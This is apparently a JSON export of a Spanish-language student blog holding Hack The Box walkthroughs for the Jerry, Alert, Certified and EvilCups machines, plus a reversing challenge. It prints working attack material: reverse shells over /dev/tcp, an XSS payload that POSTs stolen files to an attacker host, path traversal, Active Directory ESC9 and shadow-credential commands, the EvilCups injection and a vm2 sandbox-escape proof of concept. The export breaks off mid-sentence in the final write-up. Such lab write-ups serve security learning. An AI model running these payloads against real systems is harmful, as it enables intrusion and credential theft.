
[{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/htb/challenges/","section":"Hack The Box","summary":"","title":"Challenges","type":"htb"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/ghidra/","section":"Tags","summary":"","title":"Ghidra","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/ltrace/","section":"Tags","summary":"","title":"Ltrace","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/radar2/","section":"Tags","summary":"","title":"Radar2","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/reversing/","section":"Tags","summary":"","title":"Reversing","type":"tags"},{"content":"Soy estudiante de Ingeniería de Sistemas en la Universidad Distrital Francisco José de Caldas, en Bogotá, Colombia. Actualmente curso el quinto semestre, con un fuerte interes en el Ethical Hacking.\nHabilidades #\rCiberseguridad: Conocimiento en técnicas de penetración, análisis de vulnerabilidades y respuesta ante incidentes.\nProgramación: Competencia en lenguajes como Python y Bash para la automatización de tareas y desarrollo de herramientas.\nTrabajo en equipo: Experiencia en colaboración con grupos multidisciplinarios en proyectos de seguridad.\nProyectos Destacados #\rMeetups HTB #\rHe colaborado en la organización y facilitación de meetups de Hack The Box, donde he:\nFacilitado sesiones de resolución de retos: Guiando a los participantes a través de desafíos prácticos, promoviendo el aprendizaje colaborativo.\nOrganizado eventos de networking: Fomentando la interacción entre profesionales y entusiastas de la ciberseguridad.\nPresentado temas especializados: Compartiendo conocimientos sobre técnicas y herramientas de seguridad.\nEstas experiencias me han permitido fortalecer mis habilidades de comunicación, liderazgo y trabajo en equipo.\nParticipación en Grupos #\rGisac #\rMi involucramiento con el Grupo de Intercambio de Seguridad y Ciberseguridad (Gisac) ha jugado un papel esencial en mi crecimiento profesional y personal. Desde que me uní a este grupo, he tenido la oportunidad de interactuar con una comunidad de personas apasionadas por la ciberseguridad, lo que ha enriquecido profundamente mis conocimientos y habilidades.\nAl compartir experiencias y conocimientos con los miembros de Gisac, he podido aprender de personas con diferentes niveles de experiencia, lo que ha fomentado mi desarrollo tanto en aspectos técnicos como en habilidades interpersonales. Esta interacción constante me ha permitido expandir mi perspectiva sobre el panorama de la seguridad informática, y fortalecer mi capacidad para abordar problemas complejos de forma colaborativa.\nUno de los aspectos más valiosos de mi participación ha sido asistir a diferentes eventos, como el JCUN 2024, que me brindaron la oportunidad de conectar con expertos en el campo y de participar en discusiones sobre las últimas tendencias en ciberseguridad. Estos eventos no solo han contribuido al aumento de mi base de conocimientos, sino que también me han permitido entender la importancia de la actualización constante en este campo tan dinámico.\n","date":"29 marzo 2025","externalUrl":null,"permalink":"/","section":"Santiago Chavarro","summary":"","title":"Santiago Chavarro","type":"page"},{"content":"En este caso vamos a resolver un reto de reversing bastante sencillo que se puede resolver de diferentes formas.\nDespués de descargar el archivo ZIP y descomprimirlo encontraremos un ejecutable de Linux que si tratamos de ejecutar nos pedirá aun contraseña por lo que ya podemos pensar que nuestra tarea va a ser encontrar esta contraseña a continuación mostraremos tres formas diferentes de hacerlo:\nLtrace #\rSi el ejecutable nos esta pidiendo una contraseña lo primero que tenemos que analizar es que esta contraseña esta en el ejecutable y además lo esta comparando con el input del usuario por lo que usando ltrace vamos a interceptar llamadas a funciones de bibliotecas compartidas depurando así la ejecución de la aplicación:\nVemos que esta comparando nuestro input con la cadena s3cr3t_p455_f0r_gh05t5_4nd_gh0ul pero si tratamos de ingresar esto como contraseña nos dirá que es errónea lo que podemos hacer es verificar las cadenas en texto claro del ejecutable usando strings de la siguiente forma:\nPor lo que nos estaba faltando un ultimo carácter que es el 5 ya si ingresamos esto podremos ver la flag para entregar en Hack The Box.\nRadare2 y Ghidra #\rSi bien son herramientas diferentes consisten en lo mismo en este caso, vamos a analizar la función main del archivo y encontrar la comparación que hacen con nuestro input. Primero lo vamos a hacer con radare2 y ya después mostraremos ghidra.\nAcá lo que estamos haciendo es mirar las funciones existentes en el ejecutable donde podemos observar esta el main incluido por lo que lo vamos a revisar mas a fondo de la siguiente manera:\nLo que hace esto es mostrarnos que esta haciendo el ejecutable a mas bajo nivel y si miramos un poco encontraremos tanto la flag como la contraseña entre la salida que nos mostro el comando pdf @main .\nPara ghidra toca hacer unos cuantos pasos mas pero podemos ver con mayor claridad esto, vamos a abrir la aplicación y vamos a crear un nuevo proyecto después de esto vamos a importar el ejecutable que descargamos de la pagina de Hack The Box, luego de esto vamos a arrastrar ese ejecutable al símbolo de dragón que hay arriba a la izquierda:\nYa con esto a la izquierda veremos un árbol de funciones por lo que si ingresamos a main veremos la contraseña de esta forma:\n","date":"29 marzo 2025","externalUrl":null,"permalink":"/htb/challenges/spookypass/","section":"Hack The Box","summary":"","title":"SpookyPass","type":"challenges"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\rDescripción: #\rMaquina bastante sencilla que nos pide utilizar unas credenciales predeterminadas para explotar la carga y ejecucion de archivos war en tomcat\nEnumeración #\rLo primero que vamos a hacer en esta maquina después de conectarnos a la VPN es mandar los siguientes dos comandos de nmap con el fin de identificar los puertos abiertos y los servicios junto con sus versiones de estos puertos:\nsudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts #El segundo comando se envia especificando los puertos que el primero nos mostro abiertos #En este caso solo nos mostro el puerto 8080 nmap -p8080 -sVC -A {IP} -oN target Con el primer comando vamos a hacer un escaneo rápido principalmente porque con el segundo será mas exhaustivo lo que hace el primer comando es:\nsudo nmap -p- \u0026ndash;open \u0026ndash;min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts -p-: Escanea todos los puertos (1-65535). \u0026ndash;open: Solo muestra los puertos abiertos. \u0026ndash;min-rate 5000: Establece una tasa mínima de paquetes por segundo. -sS: Realiza un escaneo SYN \u0026ldquo;sigiloso\u0026rdquo;. -Pn: No hace ping (asume que el host está activo). -n: No realiza resolución DNS. -oG allPorts: Guarda la salida en formato grepeable en el archivo allPorts. Mientras que el segundo escaneo hace esto:\nnmap -p8080 -sVC -A {IP} -oN target -p8080: Escanea específicamente el puerto 8080. -sVC: Combina las opciones -sV (detección de versión) y -sC (scripts por defecto). -A: Habilita la detección de OS, versiones, scripts y traceroute. -oN target: Guarda la salida en formato normal en el archivo target. Despues de ejecutar estos dos podremos ver la siguiente salida:\nLo único que podemos ver con esto es que en el puerto 8080 esta corriendo un servicio http que esta usando Apache Tomcat .\nPuerto 8080 #\rAl ingresar a la pagina especificando en el navegador la IP y el puerto veremos esta pagina muy sencilla, si buscamos un poco lo único interesante que tendremos es el “Manager App” que nos pide usuario y contraseña, haciendo una rápida búsqueda de credenciales predeterminadas de apache encontramos varias probando nos daremos cuenta que funcionan tomcat:s3cret por lo que tendremos acceso a “Manager App”:\nSi leemos un poco lo que dice nos podremos dar cuenta que podemos subir y desplegar archivos WAR en la pagina.\nExplotación #\rSi buscamos como explotar un archivo WAR en Tomcat podremos hallar la siguiente pagina la cual nos explica como crear un archivo con una Shell reversa que podremos usar para conectarnos a la maquina Hack Tricks.\nVamos a hacer el paso a paso para poder acceder a la maquina:\n#Crear el archivo infectado git clone https://github.com/mgeeky/tomcatWarDeployer.git cd tomcatWarDeployer python3 tomcatWarDeployer.py -U \u0026lt;username\u0026gt; -P \u0026lt;password\u0026gt; -H \u0026lt;ATTACKER_IP\u0026gt; -p \u0026lt;ATTACKER_PORT\u0026gt; \u0026lt;VICTIM_IP\u0026gt;:\u0026lt;VICTIM_PORT\u0026gt;/manager/html/ #Ponernos en escucha por el puerto 4444 nc -lvnp 4444 Después de ejecutar estos comandos vamos a entrar a la pagina y subir el archivo para posteriormente oprimir el botón Deploy .\nUna vez hagamos esto nos debería aparecer algo parecido a lo siguiente:\nVamos a darle al botón Reload de la aplicación revshell con esto habremos ingresado a la maquina ya para obtener las dos flags para Hack The Box nos dirigiremos a:\nC:\\Users\\Administrator\\Desktop\\flags\n","date":"27 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/jerry/","section":"Hack The Box","summary":"","title":"Jerry","type":"maquinas"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/","section":"Hack The Box","summary":"","title":"Máquinas","type":"htb"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat","type":"tags"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/tags/war-file/","section":"Tags","summary":"","title":"WAR-File","type":"tags"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"\rDescripción: #\rMaquina en la cual se encuentra una visualizador de archivos Markdowns, vulnerable a xss cross site scripting, mediante una opcion para compartir los archivos .md subimos un codigo con la intencion de hacer un phishing y contactar con el administrador para enumerar información sensible.\nYa con un usuario y contraseña se realiza un escalamiento de privilegios mediante un port forwarding debido a un servicio que estaba corriendo como root.\nEnumeración #\rCon nmap vamos a revisar que puertos estan abiertos y que servicios estan corriendo.\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.36.72 -oG allPorts nmap -sCV -p22,80 10.129.36.72 -oN target Podemos ver que en el puerto 80, en la segunda línea, nos aparece la URL del servicio HTTP, por lo que la vamos a agregar al archivo /etc/hosts junto con la IP para poder abrir la página.\nsudo nano /etc/hosts Vamos a buscar subdominios con un código de estado diferente a 301 utilizando la herramienta wfuzz.\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#34;Host: FUZZ.alert.htb\u0026#34; http://alert.htb/ | grep -v \u0026#34;301\u0026#34; Vemos que encontramos un subdominio, el cual también se debe agregar al archivo /etc/hosts como statistics.alert.htb.\nEn la página que está en el puerto 80, podemos subir archivos Markdown (.md) y enviar una solicitud al administrador.\nEn el subdominio nos pide una contraseña y no podemos ingrasar\nDespués de buscar, encontramos que podemos ejecutar algunas acciones mediante el archivo Markdown. Además, si subimos el archivo y oprimimos el botón de compartir, podemos enviarle el enlace del archivo a alguien mas.\nPodemos comprobar que funciona con una alert en JavaScript:\n\u0026lt;!-- XSS with regular tags --\u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;img src=x onerror=alert(1) /\u0026gt; Explotación xss #\rPodemos probar a obtener información de una de las rutas a las cuales no tenemos acceso, como messages.\n\u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages/\u0026#34;) // Realiza la solicitud GET .then(response =\u0026gt; response.text()) // Convierte la respuesta en texto .then(data =\u0026gt; { // Luego, realiza la solicitud POST con los datos obtenidos return fetch(\u0026#34;http://IP:4444/\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data // Envia los datos obtenidos en el cuerpo de la solicitud POST }); }) .then(response =\u0026gt; response.text()) // Espera la respuesta de la solicitud POST .then(result =\u0026gt; { console.log(result); // Muestra la respuesta de la solicitud POST }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); // Maneja errores de las solicitudes }); \u0026lt;/script\u0026gt; Lo que vamos a hacer es intentar que el administrador abra el archivo por nosotros y nos envíe el contenido, utilizando el código anterior y con nc recibir la respuesta.\nDespués de subir el archivo, lo que hacemos es darle a \u0026lsquo;Compartir\u0026rsquo; y copiar la URL para luego preparar Netcat y enviar la solicitud al administrador.\nnc -lvnp 4444 Pero nos indica lo mismo: que no tenemos permisos.\nSi buscamos en Google archivos de configuración predeterminados para un servidor Apache, encontramos la siguiente ruta: /etc/apache2/sites-enabled/000-default.conf. Entonces, vamos a repetir lo anterior, cambiando la ruta por un archivo PHP llamado messages.php, seguido del archivo de configuración.\n\u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-enabled/000-default.conf\u0026#34;) // Realiza la solicitud GET .then(response =\u0026gt; response.text()) // Convierte la respuesta en texto .then(data =\u0026gt; { // Luego, realiza la solicitud POST con los datos obtenidos return fetch(\u0026#34;http://IP:4444/\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data // Envia los datos obtenidos en el cuerpo de la solicitud POST }); }) .then(response =\u0026gt; response.text()) // Espera la respuesta de la solicitud POST .then(result =\u0026gt; { console.log(result); // Muestra la respuesta de la solicitud POST }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); // Maneja errores de las solicitudes }); \u0026lt;/script\u0026gt; Vemos que hay una ruta a lo que podría ser un archivo con contraseñas llamado .htpasswd. Entonces, vamos a hacer el mismo proceso, pero con este nuevo archivo: http://alert.htb/messages.php?file=../../../var/www/statistics.alert.htb/.htpasswd\nY recibimos un archivo en el que, al parecer, está un usuario con su hash. Si quieren saber qué tipo de hash es, pueden buscar \u0026lsquo;Hash Identifier\u0026rsquo; y pegarlo, para descifrarlo vamos a usar el siguiente comando:\n# Comando para hashcat hashcat -m 1600 -a 0 pass.txt /usr/share/wordlists/rockyou.txt # Comando para John john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Y obtenemos la contraseña del usuario Albert.\nRoot #\rNos conectamos como Albert mediante SSH.\nssh albert@IP Ya estando dentro del sistema, podemos observar dos cosas. Si usamos el comando id, veremos que nuestro usuario pertenece a un grupo peculiar: uid=1000(albert), gid=1000(albert), groups=1000(albert), 1001(management).\nHaciendo uso del siguiente comando, podremos buscar todos los archivos que tengan que ver con dicho grupo en específico.\nfind / -type f -group management 2\u0026gt;/dev/null La salida del comando anterior nos reporta que nuestro usuario tiene permisos completos en /opt/website-monitor/config/configuration.php.\nPor la ruta absoluta del archivo, podemos inferir que existe otro servicio web local (ya que no fue reportado en nuestro escaneo con nmap). Vemos los puertos internos en escucha con netstat -tuln:\nSi usamos ps aux, podremos observar que el servicio está corriendo como root, por lo que procedemos a hacer port forwarding (asegúrate de que tu puerto {port} no esté en uso).\nssh -L {port}:localhost:8080 albert@IP Después de revisar /opt/website-monitor/config/configuration.php más a detalle, resulta que nuestro usuario tiene permisos completos sobre toda la carpeta /config. A juzgar por lo simple de la aplicación, deberíamos poder acceder a cualquier archivo dentro del directorio /website-monitor. Con nuestros permisos de escritura en la carpeta /config, podemos crear un archivo con una revshell PHP alojado en dicha carpeta para obtener una shell como root.\n\u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;/dev/tcp/{IP}/{PORT} 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; Para activar el archivo .php, solo es necesario ingresar su ruta en el navegador:\nhttp://localhost:{port}/config/payload.php.\n","date":"24 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/alert/","section":"Hack The Box","summary":"","title":"Alert","type":"maquinas"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/apache-server/","section":"Tags","summary":"","title":"Apache-Server","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/cross-site-scripting/","section":"Tags","summary":"","title":"Cross-Site-Scripting","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/markdown-injection/","section":"Tags","summary":"","title":"Markdown-Injection","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/port-fowarding/","section":"Tags","summary":"","title":"Port-Fowarding","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/bloodhund/","section":"Tags","summary":"","title":"BloodHund","type":"tags"},{"content":"\rDescripción: #\rMaquina en la cual con las credenciales que nos proporcionan hacemos uso de bloodhund para poder cambiar de usuario usando la tecnica Shadow Credentials, para luego mediate de una herramienta encontrar la vulnerabilidad ESC9 y poder elevar privilegios.\nEnumeración #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.41 -oG allPorts nmap -sCV -p53,88,135,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49681,49714,49719,49770 10.10.11.41 -oN target Vamos a usar las credenciales que nos provee hack the box judith.mader / judith09, vamos a listar tanto servicios compartidos como usuarios con los dos siguientes comandos.\nxc smb 10.10.11.41 -d certified.htb -u judith.mader -p judith09 --shares nxc smb 10.10.11.41 -u judith.mader -p \u0026#39;judith09\u0026#39; --users Vamos a listar las configuraciones y los protocolos que se le aplican a la maquina con el comando:\nnxc smb 10.10.11.41 -u judith.mader -p \u0026#39;judith09\u0026#39; --pass-pol La enumeración de la política de contraseñas muestra que la longitud mínima de la contraseña es de 7 caracteres, la complejidad de la contraseña está desactivada (esto significa que los usuarios pueden elegir contraseñas cortas y débiles) y, lo más importante, la opción Account Lockout Threshold, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada.\nYa con esto queremos saber que grupos y usuarios hay creados por lo que vamos a usar ldapdomaindump para que nos muestre esto.\nldapdomaindump -u \u0026#39;certified.htb\\judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; 10.10.11.41 Bloodhund #\rVamos a usar una herramienta llamada bloodhund que nos va a ayudar encontrar vulnerabilidades para saltar de un usuario a otro y hacer finalmente el escalamiento de privilegios. Para instalarlo y configurarlo seguir este paso a paso https://www.kali.org/tools/bloodhound/.\nbloodhound-python -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -ns 10.10.11.41 -d certified.htb -c all Despues de subir los archivos que nos genero el comando y buscar al usuario al cual tenemos acceso podemos ver que en Outbound Object Control tenemos la opción de saltar a otro usuario en este caso “management_scv**@certified.htb”.**\nAhora lo que vamos a hacer es seguir lo que nos dice bloodhund, descargamos los siguientes scripts:\nhttps://github.com/fortra/impacket/blob/master/examples/dacledit.py https://github.com/fortra/impacket/blob/master/examples/owneredit.py https://github.com/ShutdownRepo/pywhisker/blob/main/pywhisker/pywhisker.py python3 owneredit.py -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09 python3 dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal judith.mader -target Management certified.htb/judith.mader:judith09 net rpc group addmem management management -U certified.htb/judith.mader%judith09 -S certified.htb pth-net rpc group addmem management judith.mader -U certified.htb/judith.mader%37937096CA6E6E2209752A3293831D17:8EC62AC86259004C121A7DF4243A7A80 -S certified.htb Despues de esto lo que hemos hecho es agregar a judith al grupo management y ahora podemos modificar ls atributos de management_svc para verificar que todo se ha hecho ejecutamos el comando a continuacion.\nnet rpc group members management -U certified.htb/judith.mader%judith09 -S certified.htb Ahora para aplicar el ataque de shadow credentials vamos a usar una herramienta llamada certipy la cual vamos a instalar en un entorno virtual de python.\npython3 -m venv env source env/bin/activate pip3 install certipy-ad Si bien podriamos mandar el comando de certipy solamente es my probable que tengamos un error debido a que nuestra hora es diferente al de la maquina por lo que tambien vamos a usar faketime de la siguiente manera:\nfaketime \u0026#34;$(ntpdate -q certified.htb | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; certipy shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc Ahora desde bloodhund podemos ver que podemos cambiar hacia el usuario ca_operator con un GenericAll por lo que vamos a seguir lo que nos dice.\npth-net rpc password ca_operator \u0026#34;nueva contraseña\u0026#34; -U certified.htb/management_svc%ffffffffffffffffffffffffffffffff:a091c1832bcdd4677c28b5a6a1295584 -S certified.htb Con esto le hemos cambiado la contraseña a el usuario ca_operator ahora vamos a tratar de encontrar alguna otra vulnerabilidad usando certipy de nuevo.\ncertipy find -dc-ip 10.10.11.41 -u ca_operator -p \u0026#34;nueva contraseña\u0026#34; Abriendo el txt que nos deja este comando en la parte de certipy templates podemos ver una vulnerabilidad ESC9\nVamo a irnos a esta pagina para que nos de el hash de la contraseña que le asignamos https://www.browserling.com/tools/ntlm-hash y luego vamos a ejecutar los siguientes comandos para explotar el ESC9\ncertipy account update -username management_svc@certified.htb -hashes \u0026#34;hash management_svc\u0026#34; -user ca_operator -upn administrator certipy req -username ca_operator@certified.htb -hashes \u0026#34;hash nueva contraseña\u0026#34; -ca certified-DC01-CA -template CertifiedAuthentication -debug \u0002\nRevertimos lo que hemos hecho con el usuario ca_operator para que cuando busqeumos el hash de administrator lo halle:\ncertipy account update -username management_svc@certified.htb -hashes \u0026#34;hash management_svc\u0026#34; -user ca_operator -upn ca_operator@certified.htb Y finalmente buscamos el hash del administrator con el siguiente comando teniendo en cuenta los problemas de hora que puede tener la maquina.\ncertipy auth -pfx administrator.pfx -domain certified.htb Finalmente con el hash del administrator vamos a conseguir una shell y ya podremos encontrar las dos flags:\nevil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34 ","date":"16 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/certified/","section":"Hack The Box","summary":"","title":"Certified","type":"maquinas"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/esc9/","section":"Tags","summary":"","title":"ESC9","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/impacket/","section":"Tags","summary":"","title":"Impacket","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/netexec/","section":"Tags","summary":"","title":"Netexec","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/shadow-credentials/","section":"Tags","summary":"","title":"Shadow-Credentials","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47076/","section":"Tags","summary":"","title":"CVE-2024-47076","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47175/","section":"Tags","summary":"","title":"CVE-2024-47175","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47176/","section":"Tags","summary":"","title":"CVE-2024-47176","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47177/","section":"Tags","summary":"","title":"CVE-2024-47177","type":"tags"},{"content":"\rDescripción: #\rMaquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre\nEnumeración #\rsudo nmap -p- --min-rate 5000 -Pn -n --open -sS [IP] -oG allPorts nmap -p22,601 -sVC -A [IP] -oN target Si hacemos una rápida búsqueda de puerto 631 encontraremos que además de mencionar el puerto TCP también mencionan el puerto pero en UDP, debido a esto vamos a escanear también este protocolo.\nnmap -sU -p631 [IP] CUPS - TCP 631 #\rCups tiene una GUI para ayudar al uso de su servicio.\nPodemos ver que hay una impresora instalada en el servicio.\nUsuario #\rCUPS CVE’S #\rBuscando por la versión del servicio vamos a hallar diferentes vulnerabilidades que hay para este:\nCVE-2024-47176 - cups-browsed, el servicio que típicamente escucha en todas las interfaces UDP 631, es el que permite agregar una impresora a una máquina de forma remota. Esta vulnerabilidad permite que cualquier atacante que pueda alcanzar esta máquina active una solicitud \u0026ldquo;Get-Printer-Attributes\u0026rdquo; del Protocolo de Impresión por Internet (IPP) que se envía a una URL controlada por el atacante. Esto se corrigió simplemente deshabilitando cups-browsed ya que no es realmente la mejor manera de obtener esta funcionalidad. CVE-2024-47076 - libcupsfilters es responsable de manejar los atributos IPP devueltos de la solicitud. Estos se escriben en un archivo temporal de Descripción de Impresora Postscript (PPD) sin sanitización, permitiendo que se escriban atributos maliciosos. CVE-2024-47175 - libppd es responsable de leer un archivo PPD temporal y convertirlo en un objeto de impresora en el sistema. Tampoco realiza sanitización durante la lectura, permitiendo la inyección de datos controlados por el atacante. CVE-2024-47177 - Esta vulnerabilidad en cups-filters permite cargar una impresora usando el filtro de impresión foomatic-rip, que es un convertidor universal para transformar datos PostScript o PDF al formato que la impresora puede entender. Ha tenido problemas de inyección de comandos durante mucho tiempo y se ha limitado solo a instalaciones y configuraciones manuales. Combinando estas cuatro vulnerabilidades podremos agregar una impresora y ejecutar comandos cuando imprimamos desde esta.\nExplotación #\rEl creador de la maquina tiene una script que nos va a ayudar a resolver esta maquina.\nLa función __main__ nos da una buena idea de que hace el script:\nif __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 4: print(\u0026#34;%s \u0026lt;LOCAL_HOST\u0026gt; \u0026lt;TARGET_HOST\u0026gt; \u0026lt;COMMAND\u0026gt;\u0026#34; % sys.argv[0]) quit() SERVER_HOST = sys.argv[1] SERVER_PORT = 12345 command = sys.argv[3] server = IPPServer((SERVER_HOST, SERVER_PORT), IPPRequestHandler, MaliciousPrinter(command)) threading.Thread( target=run_server, args=(server, ) ).start() TARGET_HOST = sys.argv[2] TARGET_PORT = 631 send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT) print(\u0026#34;Please wait this normally takes 30 seconds...\u0026#34;) seconds = 0 while True: print(f\u0026#34;\\r{seconds} elapsed\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) time.sleep(1) seconds += 1 Al leer el script nos damos cuenta que lo que esta haciendo es montar un servidor ipp y mandarle un paquete, vamos a revisar en donde se vuelve malicioso el paquete que envía ya que todos los atributos son normales menos el ultimo donde hace una inyección pasándole FoomaticRIPCommandLine.\nclass MaliciousPrinter(behaviour.StatelessPrinter): def __init__(self, command): self.command = command super(MaliciousPrinter, self).__init__() def printer_list_attributes(self): attr = { # rfc2911 section 4.4 ( SectionEnum.printer, b\u0026#39;printer-uri-supported\u0026#39;, TagEnum.uri ): [self.printer_uri], ( ...[snip]... ( SectionEnum.printer, b\u0026#39;printer-more-info\u0026#39;, TagEnum.uri ): [f\u0026#39;\u0026#34;\\n*FoomaticRIPCommandLine: \u0026#34;{self.command}\u0026#34;\\n*cupsFilter2 : \u0026#34;application/pdf application/vnd.cups-postscript 0 foomatic-rip\u0026#39;.encode()], ...[snip]... Agregar la impresora #\rPara esto vamos a ejecutar el script de la siguiente forma:\npython evilcups.py 10.10.14.152 10.129.231.157 \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; Y si vamos a la pagina http que tiene el servicio a la parte de impresoras tendremos una nueva impresora:\nListo ahora es el momento de probar si ejecuta comandos:\n# Nos ponemos en escucha nc -lvnp 4444 En la pagina de la impresora en la sección de mantenimiento podemos imprimir una pagina de prueba con esto conseguiremos la shell y la flag.\nUna mejor shell para enviar seria nohup bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026quot;\u0026amp;, ya que inicia un proceso en segundo plano, para evitar que la shell se pierda cada 5 minutos aproximadamente cuando al impresora se elimina.\nRoot #\rPrimero hacemos el tratamiento de la tty como acostumbramos:\nAquí está el tratamiento típico de la TTY:\nscript /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm Listo después de listar por un rato no encontré nada interesante por lo que me devolví a la web y vi que la impresora que siempre esta presente tenia un trabajo que había realizado así que revisando la documentación nos dimos cuenta que estos trabajos se guardan en /var/spool/cups/ y si bien no podemos listar dentro del directorio por medio de la documentación sabemos el nombre del archivo que es d[5 números]-001 por lo tanto si ejecutamos el siguiente comando veremos el archivo:\ncat d00001-001 Entonces vamos a mandarnos este archivo a nuestra maquina para enviar el archivo vamos a usar /dev/tcp podemos hacer:\n# En nuestra maquina nc -lvnp 4444 \u0026gt; archivo.pdf # En la maquina victima cat d00001-001 \u0026gt; /dev/tcp/TU_IP/4444 De esta forma el archivo se transferirá a nuestra máquina a través de una conexión TCP en el puerto 4444.\nY si abrimos este pdf en nuestra maquina tendremos la contraseña para root:\nSi quieres aprender mas sobre el CVE que se exploto tienes estas referencias:\nhttps://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ ","date":"11 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/evilcups/","section":"Hack The Box","summary":"","title":"EvilCups","type":"maquinas"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/udp/","section":"Tags","summary":"","title":"UDP","type":"tags"},{"content":"\rDescripción: #\rMaquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.\nEnumeración #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts nmap -sCV -p22,80,3000 -A -oN target IP Si tratamos de usar gobuster no encontraremos ningun subdominio ni subdirectorio interesante por lo que no lo voy a mostrar.\nPuerto 80 #\rPodemos ver como tenemos la posibilidad de ejecutar comandos node.js usando la libreria vm2 ademas de esto no vamos a encontrar nada más intreresante por lo que vamos a buscar vulnerabilidades de la libreria.\nEncontraremos la siguiente poc para la libreria en github que es la que vamos a estar usando POC.\nconst {VM} = require(\u0026#34;vm2\u0026#34;); const vm = new VM(); const code = ` err = {}; const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); } }; const proxiedErr = new Proxy(err, handler); try { throw proxiedErr; } catch ({constructor: c}) { c.constructor(\u0026#39;return process\u0026#39;)().mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch pwned\u0026#39;); } ` console.log(vm.run(code)); User #\rYa con esto vamos a poder ejecutar comandos y asi montar una revshell, nos dirigiremos a 